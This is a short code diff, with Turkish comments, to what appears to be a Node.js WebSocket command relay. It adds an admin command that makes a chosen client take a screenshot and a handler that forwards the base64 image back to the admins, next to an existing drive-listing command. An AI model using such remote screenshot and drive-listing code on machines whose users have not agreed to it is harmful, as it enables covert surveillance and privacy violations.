@@ -151,6 +151,28 @@ wss.on("connection", (ws) => {
         });
       }
 
+      // ADMIN MESAJLARI kısmına (request_screenshot_save'dan sonra) şunu ekleyin:
+
+if (msg.type === "request_screenshot") {
+  const target = getClient(msg.targetId);
+  if (!target) return sendClientNotFound(ws);
+
+  return send(target, {
+    type: "request_screenshot"
+  });
+}
+
+// CLIENT MESAJLARI kısmına şunu ekleyin:
+
+if (msg.type === "screenshot_data") {
+  return broadcastToAdmin({
+    type: "screenshot_data",
+    clientId: ws.clientId,
+    base64: String(msg.base64 || ""),
+    timestamp: Date.now()
+  });
+}
+
       if (msg.type === "list_drives") {
         const target = getClient(msg.targetId);
         if (!target) return sendClientNotFound(ws);
